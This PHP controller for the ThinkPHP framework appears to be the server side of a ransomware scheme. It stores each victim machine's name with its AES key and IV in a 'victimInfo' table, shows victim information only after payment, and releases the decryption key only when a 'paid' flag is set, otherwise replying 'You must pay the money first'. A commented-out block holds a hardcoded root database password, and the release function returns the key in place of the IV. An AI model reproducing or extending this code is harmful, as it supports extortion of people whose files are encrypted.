<?php
namespace app\index\controller;

use think\Controller;
use app\index\model\index as victimModel;
use think\View;
use think\Db;
class Index extends Controller
{
    public function index()
    {
        // return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:)</h1><p> ThinkPHP V5<br/><span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架</span></p><span style="font-size:22px;">[ V5.0 版本由 <a href="http://www.qiniu.com" target="qiniu">七牛云</a> 独家赞助发布 ]</span></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="ad_bd568ce7058a1091"></think>';
        return view();
    }

    // // connect to db and gain information
    // public function dbTest()
    // {
    //     return Db::connect([
    //     'type'=>'mysql',
    //     'hostname'=>'127.0.0.1',
    //     'database'=>'testDB',
    //     'username'=>'root',
    //     'password'=>'BAqi2886',
    //     ])
    //     ->table('testTable')
    //     ->where('id','2')
    //     ->value('name');
    // }

    // Show info to victim who has paid
    public function showinfo()
    {
        $vict = victimModel::get(input('post.id'));
        // echo $vict['id'] . '<br/>';
        // echo $vict['pcname'] . '<br/>';
        if ($vict['paid']) {
            $this->assign('vict_info',$vict);
            return $this->fetch();
        } else {
            $this->redirect('http://localhost/project/public/');
            // echo "You haven't paid yet!";
        }
    }

    // Get the key and iv of aes algorithm, then store in db
    public function storeKeys($pcname,$aeskey,$aesiv)
    {
        $data = ['pcname'=>$pcname,'AESkey'=>$aeskey,'AESiv'=>$aesiv,'paid'=>false];
        // Db::execute('delete from tears where id>1');
        // $result = Db::execute('delete from tears where payed=true');
        // dump($result);
        return Db::table('victimInfo')->insertGetId($data);
    }

    // Release the key when paid
    public function releaseKeys($id)
    {
        $if_paid = Db::table('victimInfo')->where('id',$id)->value('paid');
        if ($if_paid) {
            $AESkey = Db::table('victimInfo')->where('id',$id)->value('AESkey');
            $AESiv = Db::table('victimInfo')->where('id',$id)->value('AESkey');
            $aesData = ['aeskey'=>$AESkey,'aesiv'=>$AESiv];
            dump($aesData);
            Db::table('victimInfo')->where(['id'=>$id,'paid'=>true])->delete();
        }
        else return "You must pay the money first";
    }
}